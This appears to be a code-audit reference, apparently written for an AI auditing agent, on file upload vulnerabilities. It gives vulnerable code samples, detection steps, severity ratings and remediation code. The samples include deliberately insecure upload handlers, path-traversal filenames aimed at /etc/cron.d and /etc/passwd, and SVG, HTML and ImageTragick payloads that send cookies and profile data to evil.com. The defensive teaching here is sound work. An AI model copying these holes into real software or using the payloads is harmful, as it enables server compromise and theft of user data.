<!-- Adapted audit reference. Apply its vulnerability-specific checks through the Codex-native BALLS workflow and evidence rules. -->

## Overview

## ⚠️ Mandatory: Concrete Data Flow Proof Required

**DO NOT report a finding based on pattern-matching alone.** For every potential vulnerability you identify:

1. **Find the SINK** (dangerous function/API call)
2. **Trace all callers** — use `codegraph callers <symbol>` or `codegraph explore "<flow question>"` to identify call sites and execution paths.
3. **For each caller, trace the argument origin**:
   - Hardcoded/constant value → **Skip** (not a vulnerability, just bad practice)
   - Config file / admin-only source → **Skip** (not exploitable from internet)
   - User-controlled input (HTTP request, RPC, file upload, etc.) → **Investigate further**
   - Another service / database → **Trace upstream** to find the ultimate source
4. **Document the complete path**: SOURCE (file:line) → INTERMEDIATES (file:line each) → SINK (file:line)
5. **Verify no sanitization** between source and sink that would prevent exploitation

**"If an attacker controls X" is NOT a valid finding. You must prove X is user-controlled by tracing the actual code.**

File upload vulnerabilities occur when applications accept user-supplied files without adequate validation of file type, content, name, and size. Exploiting these flaws can lead to remote code execution (uploading web shells), stored cross-site scripting (malicious SVG/HTML), denial of service (ZIP bombs), path traversal (overwriting critical files), and information disclosure. File uploads represent one of the most dangerous attack surfaces because they allow attackers to place arbitrary content on the server.

## Vulnerability Patterns

### Unrestricted File Upload — No Validation

```python
# Python/Flask — VULNERABLE: No file type validation
@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    # VULNERABLE: Saves any file type — attacker uploads .php, .jsp, .aspx
    file.save(os.path.join('/var/www/html/uploads', file.filename))
    return 'File uploaded successfully'
```

```javascript
// Node.js/Express — VULNERABLE: No restrictions
const multer = require('multer');
const storage = multer.diskStorage({
    destination: './public/uploads/',  // VULNERABLE: In webroot
    filename: (req, file, cb) => {
        // VULNERABLE: Uses original filename without sanitization
        cb(null, file.originalname);
    }
});

const upload = multer({ storage: storage }); // No fileFilter, no limits

app.post('/upload', upload.single('file'), (req, res) => {
    res.json({ path: `/uploads/${req.file.filename}` });
});
```

```java
// Java/Spring — VULNERABLE: No validation
@PostMapping("/upload")
public String handleFileUpload(@RequestParam("file") MultipartFile file) {
    // VULNERABLE: No content type check, no extension check
    String filename = file.getOriginalFilename();
    Path destination = Paths.get("/var/www/uploads/" + filename);
    Files.copy(file.getInputStream(), destination);
    return "Upload successful: " + filename;
}
```

```csharp
// C# ASP.NET — VULNERABLE: No file validation
[HttpPost("upload")]
public async Task<IActionResult> Upload(IFormFile file)
{
    // VULNERABLE: No extension filter, no content validation
    var path = Path.Combine(_env.WebRootPath, "uploads", file.FileName);
    using var stream = new FileStream(path, FileMode.Create);
    await file.CopyToAsync(stream);
    return Ok(new { path = $"/uploads/{file.FileName}" });
}
```

### Extension Validation Bypass

```python
# Python — VULNERABLE: Easily bypassed extension check
def is_allowed_file(filename):
    # VULNERABLE: Double extension bypass: "shell.php.jpg"
    # VULNERABLE: Null byte bypass (older systems): "shell.php%00.jpg"
    # VULNERABLE: Case sensitivity: "shell.PHP", "shell.pHp"
    return filename.endswith('.jpg') or filename.endswith('.png')

# Also vulnerable patterns:
# - Checking only the first extension: "image.jpg.php"
# - Blocklist instead of allowlist: blocks .php but not .phtml, .php5, .phar
# - Missing extensions: .shtml, .shtm, .htaccess, .user.ini
```

```javascript
// Node.js — VULNERABLE: MIME type from client
const upload = multer({
    fileFilter: (req, file, cb) => {
        // VULNERABLE: MIME type is sent by the client and can be spoofed
        if (file.mimetype === 'image/jpeg' || file.mimetype === 'image/png') {
            cb(null, true);
        } else {
            cb(new Error('Only images allowed'));
        }
    }
});
```

```java
// Java — VULNERABLE: Blocklist approach
private static final List<String> BLOCKED_EXTENSIONS =
    Arrays.asList(".php", ".jsp", ".exe", ".sh");

public boolean isAllowed(String filename) {
    String ext = filename.substring(filename.lastIndexOf('.'));
    // VULNERABLE: Misses .phtml, .php5, .jspx, .war, .bat, .cmd, .ps1
    // VULNERABLE: Case sensitivity — .PHP, .Jsp not blocked
    return !BLOCKED_EXTENSIONS.contains(ext.toLowerCase());
}
```

### Path Traversal via Filename

```python
# Python — VULNERABLE: Filename contains path traversal
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    # VULNERABLE: filename = "../../../etc/cron.d/backdoor"
    # or filename = "..\\..\\..\\windows\\system32\\evil.exe"
    filepath = os.path.join(UPLOAD_DIR, file.filename)
    file.save(filepath)
```

```javascript
// Node.js — VULNERABLE: No filename sanitization
app.post('/upload', upload.single('file'), (req, res) => {
    // VULNERABLE: req.file.originalname could be "../../config/database.yml"
    const dest = path.join(__dirname, 'uploads', req.file.originalname);
    fs.renameSync(req.file.path, dest);
});
```

```go
// Go — VULNERABLE: Path traversal in filename
func uploadHandler(w http.ResponseWriter, r *http.Request) {
    file, header, _ := r.FormFile("upload")
    defer file.Close()

    // VULNERABLE: header.Filename = "../../../../etc/passwd"
    dst, _ := os.Create(filepath.Join("./uploads", header.Filename))
    defer dst.Close()
    io.Copy(dst, file)
}
```

### Stored XSS via Uploaded Files

```html
<!-- SVG with embedded JavaScript — VULNERABLE if served as image/svg+xml -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script>alert('XSS via SVG upload')</script>
  <text x="10" y="25">Malicious SVG</text>
</svg>

<!-- SVG with event handlers -->
<svg onload="fetch('https://evil.com/steal?cookie='+document.cookie)">
  <circle cx="50" cy="50" r="40"/>
</svg>
```

```html
<!-- HTML file uploaded and served from same origin -->
<!DOCTYPE html>
<html>
<body>
<script>
  // Same-origin: full access to cookies, localStorage, DOM
  fetch('/api/user/profile', {credentials: 'include'})
    .then(r => r.json())
    .then(data => fetch('https://evil.com/exfil', {
      method: 'POST', body: JSON.stringify(data)
    }));
</script>
</body>
</html>
```

```javascript
// PDF with JavaScript
// Malicious PDF can contain JavaScript that executes in PDF viewers
// %PDF-1.4
// /OpenAction << /S /JavaScript /JS (app.alert('XSS in PDF')) >>
```

### Image Processing Vulnerabilities (ImageTragick)

```python
# Python — VULNERABLE: ImageMagick command injection
import subprocess

def resize_image(input_path, output_path, size):
    # VULNERABLE: ImageMagick processes malicious image files
    # ImageTragick (CVE-2016-3714) allows RCE via crafted images
    subprocess.call(['convert', input_path, '-resize', size, output_path])

# Malicious SVG triggering ImageTragick:
# push graphic-context
# viewbox 0 0 640 480
# fill 'url(https://evil.com/image.jpg"|ls "-la)'
# pop graphic-context
```

```python
# Python/Pillow — VULNERABLE: Decompression bomb
from PIL import Image

def process_image(file_path):
    # VULNERABLE: No pixel limit — decompression bomb
    # A 100KB file can decompress to 10GB+ in memory
    img = Image.open(file_path)
    img.thumbnail((800, 600))
    img.save('output.jpg')
```

```javascript
// Node.js/Sharp — VULNERABLE: SVG processing
const sharp = require('sharp');

app.post('/resize', upload.single('image'), async (req, res) => {
    // VULNERABLE: Sharp processes SVG files which can contain XXE/SSRF
    await sharp(req.file.path)
        .resize(300, 200)
        .toFile('output.jpg');
});
```

### Archive Extraction Vulnerabilities

```python
# Python — VULNERABLE: Zip Slip (path traversal in archive)
import zipfile

def extract_upload(zip_path, extract_dir):
    with zipfile.ZipFile(zip_path, 'r') as zf:
        # VULNERABLE: Entry names can contain "../" path traversal
        # e.g., "../../etc/cron.d/backdoor"
        zf.extractall(extract_dir)
```

```java
// Java — VULNERABLE: Zip Slip
public void unzip(String zipFilePath, String destDir) throws IOException {
    ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFilePath));
    ZipEntry entry;
    while ((entry = zis.getNextEntry()) != null) {
        // VULNERABLE: entry.getName() = "../../../etc/passwd"
        File file = new File(destDir, entry.getName());
        FileOutputStream fos = new FileOutputStream(file);
        // Writes outside intended directory
        IOUtils.copy(zis, fos);
        fos.close();
    }
}
```

```go
// Go — VULNERABLE: Tar symlink attack
func extractTar(tarPath, destDir string) error {
    tr := tar.NewReader(file)
    for {
        header, err := tr.Next()
        if err == io.EOF { break }

        target := filepath.Join(destDir, header.Name)

        switch header.Typeflag {
        case tar.TypeSymlink:
            // VULNERABLE: Symlink points to /etc/shadow
            os.Symlink(header.Linkname, target)
        case tar.TypeReg:
            // Following the symlink writes to the linked file
            outFile, _ := os.Create(target)
            io.Copy(outFile, tr)
        }
    }
    return nil
}
```

```python
# Python — VULNERABLE: ZIP bomb detection missing
import zipfile

def handle_upload(file_path):
    zf = zipfile.ZipFile(file_path)
    # VULNERABLE: No check on uncompressed size
    # 42.zip: 42KB compressed → 4.5 petabytes uncompressed
    total_size = sum(info.file_size for info in zf.infolist())
    # Should check: if total_size > MAX_EXTRACT_SIZE: reject
    zf.extractall('/data/uploads/')
```

## Detection Methodology

1. **Upload Endpoint Discovery**: Find all file upload handlers (multipart form processing, base64 file acceptance)
2. **Validation Chain Audit**: For each upload endpoint, verify: extension allowlist, content-type validation, magic byte checking, file size limits
3. **Filename Sanitization**: Check if original filenames are used or if files are renamed with generated names
4. **Storage Location**: Verify uploads are stored outside the webroot and served through a separate domain or with proper Content-Disposition headers
5. **Content Serving**: Check how uploaded files are served — with what Content-Type, CORS headers, and CSP
6. **Image Processing**: Identify image processing libraries and check for known CVEs and safe configuration
7. **Archive Handling**: Check all archive extraction code for path traversal, symlink following, and size limits
8. **Antivirus/Scanning**: Check if uploaded files are scanned before processing
9. **Temporary File Cleanup**: Verify that failed upload temporary files are properly cleaned up
10. **Access Control**: Verify that uploaded files respect authorization (user A can't access user B's uploads)

## Common Sinks and Sources

### Upload Handling Libraries
- **Python**: `request.files`, `FileStorage`, `UploadedFile`, `InMemoryUploadedFile`
- **Node.js**: `multer`, `formidable`, `busboy`, `express-fileupload`
- **Java**: `MultipartFile`, `Part`, `@RequestParam("file")`, `commons-fileupload`
- **C#**: `IFormFile`, `HttpPostedFileBase`, `Request.Form.Files`
- **Go**: `r.FormFile()`, `multipart.FileHeader`
- **PHP**: `$_FILES`, `move_uploaded_file()`, `getimagesize()`
- **Ruby**: `params[:file]`, `ActionDispatch::Http::UploadedFile`

### Image Processing Libraries
- `ImageMagick` / `convert` / `mogrify` (all languages)
- `Pillow` / `PIL` (Python)
- `sharp` (Node.js)
- `javax.imageio` (Java)
- `System.Drawing` / `ImageSharp` (C#)
- `vips` / `libvips` (multiple languages)

### Archive Libraries
- `zipfile`, `tarfile`, `shutil.unpack_archive` (Python)
- `adm-zip`, `node-tar`, `unzipper`, `archiver` (Node.js)
- `java.util.zip`, `org.apache.commons.compress` (Java)
- `System.IO.Compression` (C#)
- `archive/zip`, `archive/tar` (Go)

## False Positive Indicators

- **Static asset uploads**: CSS/JS bundling systems that process files during build, not at runtime
- **Generated filenames**: Systems that rename files to UUIDs or content hashes (mitigates path traversal)
- **CDN/object storage**: Files uploaded to S3/GCS/Azure Blob with proper ACLs and served from a separate domain
- **Content-Disposition: attachment**: Forces download instead of inline rendering (mitigates XSS)
- **CSP headers on upload domain**: Strict CSP prevents script execution in uploaded files
- **Test file fixtures**: Upload test files in test directories
- **Image re-encoding**: Systems that decode and re-encode images (strips metadata and embedded scripts)
- **Sandboxed processing**: File processing in containers or serverless functions with no network access

## Severity Assessment

| Finding | Severity |
|---------|----------|
| Unrestricted upload in webroot (code execution) | **Critical** |
| Path traversal via filename (arbitrary file write) | **Critical** |
| Archive extraction with path traversal (Zip Slip) | **Critical** |
| ImageMagick RCE (ImageTragick) | **Critical** |
| Upload overwriting application files | **Critical** |
| SVG/HTML upload with same-origin serving (XSS) | **High** |
| Missing file size limits (DoS) | **High** |
| ZIP bomb / decompression bomb | **High** |
| Tar symlink extraction attack | **High** |
| Extension validation bypass (blocklist) | **High** |
| MIME type-only validation (client-spoofable) | **Medium** |
| PDF upload with JavaScript | **Medium** |
| Image metadata not stripped (EXIF GPS, etc.) | **Medium** |
| Predictable upload paths (information disclosure) | **Medium** |
| Missing antivirus scanning on uploads | **Low** |
| Uploaded file access control missing | **Medium** |

## Remediation Patterns

### Comprehensive Upload Validation
```python
# SECURE: Multi-layer upload validation
import magic
import os
import uuid
from pathlib import Path

ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}
ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
UPLOAD_DIR = '/data/uploads'  # Outside webroot

def validate_and_save_upload(file):
    # 1. Check file size
    file.seek(0, os.SEEK_END)
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        raise ValueError("File too large")

    # 2. Check extension (allowlist)
    original_name = file.filename
    ext = Path(original_name).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension {ext} not allowed")

    # 3. Check magic bytes (content-based detection)
    mime = magic.from_buffer(file.read(2048), mime=True)
    file.seek(0)
    if mime not in ALLOWED_MIMES:
        raise ValueError(f"File type {mime} not allowed")

    # 4. Generate safe filename (no original name)
    safe_name = f"{uuid.uuid4().hex}{ext}"
    filepath = os.path.join(UPLOAD_DIR, safe_name)

    # 5. Verify path is within upload directory
    real_path = os.path.realpath(filepath)
    if not real_path.startswith(os.path.realpath(UPLOAD_DIR)):
        raise ValueError("Path traversal detected")

    file.save(filepath)
    return safe_name
```

### Safe Filename Generation
```javascript
// SECURE: Never use original filename
const crypto = require('crypto');
const path = require('path');

const ALLOWED_EXT = new Set(['.jpg', '.jpeg', '.png', '.gif']);

function safeFilename(originalName) {
    const ext = path.extname(originalName).toLowerCase();
    if (!ALLOWED_EXT.has(ext)) {
        throw new Error('Invalid file extension');
    }
    return `${crypto.randomUUID()}${ext}`;
}
```

### Safe Archive Extraction
```python
# SECURE: Zip extraction with path traversal protection
import zipfile
import os

MAX_EXTRACT_SIZE = 100 * 1024 * 1024  # 100MB total
MAX_FILES = 1000

def safe_extract(zip_path, extract_dir):
    extract_dir = os.path.realpath(extract_dir)

    with zipfile.ZipFile(zip_path, 'r') as zf:
        # Check total uncompressed size (ZIP bomb protection)
        total_size = sum(info.file_size for info in zf.infolist())
        if total_size > MAX_EXTRACT_SIZE:
            raise ValueError("Archive too large when extracted")

        if len(zf.infolist()) > MAX_FILES:
            raise ValueError("Too many files in archive")

        for entry in zf.infolist():
            # Resolve the target path
            target = os.path.realpath(os.path.join(extract_dir, entry.filename))

            # Path traversal check
            if not target.startswith(extract_dir + os.sep):
                raise ValueError(f"Path traversal detected: {entry.filename}")

            # Skip symlinks
            if entry.is_dir():
                os.makedirs(target, exist_ok=True)
            else:
                os.makedirs(os.path.dirname(target), exist_ok=True)
                with zf.open(entry) as src, open(target, 'wb') as dst:
                    dst.write(src.read())
```

```java
// SECURE: Java Zip Slip prevention
public void safeUnzip(String zipFile, String destDir) throws IOException {
    File destDirectory = new File(destDir).getCanonicalFile();

    try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile))) {
        ZipEntry entry;
        while ((entry = zis.getNextEntry()) != null) {
            File targetFile = new File(destDirectory, entry.getName()).getCanonicalFile();

            // Path traversal check
            if (!targetFile.getPath().startsWith(destDirectory.getPath() + File.separator)) {
                throw new SecurityException("Zip entry outside target dir: " + entry.getName());
            }

            if (entry.isDirectory()) {
                targetFile.mkdirs();
            } else {
                targetFile.getParentFile().mkdirs();
                try (FileOutputStream fos = new FileOutputStream(targetFile)) {
                    IOUtils.copy(zis, fos);
                }
            }
        }
    }
}
```

### Safe File Serving
```python
# SECURE: Serve files with protective headers
from flask import send_file, make_response

@app.route('/files/<file_id>')
def serve_file(file_id):
    file_record = FileRecord.query.get_or_404(file_id)

    # Verify authorization
    if file_record.owner_id != current_user.id:
        abort(403)

    response = make_response(send_file(file_record.path))
    response.headers['Content-Disposition'] = 'attachment'  # Force download
    response.headers['Content-Type'] = 'application/octet-stream'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Content-Security-Policy'] = "default-src 'none'"
    return response
```

### Safe Image Processing
```python
# SECURE: Pillow with decompression bomb protection
from PIL import Image

Image.MAX_IMAGE_PIXELS = 89_478_485  # ~9500x9500 pixels

def safe_resize(input_path, output_path, max_size=(800, 600)):
    try:
        img = Image.open(input_path)
        img.verify()  # Verify image integrity
        img = Image.open(input_path)  # Re-open after verify
        img.thumbnail(max_size, Image.LANCZOS)
        # Re-encode to strip metadata and embedded scripts
        img.save(output_path, format='JPEG', quality=85)
    except (Image.DecompressionBombError, Exception) as e:
        raise ValueError(f"Invalid image: {e}")
```

## CWE References

- **CWE-434**: Unrestricted Upload of File with Dangerous Type
- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
- **CWE-79**: Improper Neutralization of Input During Web Page Generation (Stored XSS)
- **CWE-94**: Improper Control of Generation of Code (Code Injection via upload)
- **CWE-400**: Uncontrolled Resource Consumption (ZIP bomb, decompression bomb)
- **CWE-59**: Improper Link Resolution Before File Access (Symlink attacks)
- **CWE-646**: Reliance on File Name or Extension of Externally-Supplied File
- **CWE-351**: Insufficient Type Distinction (MIME type confusion)
- **CWE-73**: External Control of File Name or Path
- **CWE-616**: Incomplete Identification of Uploaded File Variables
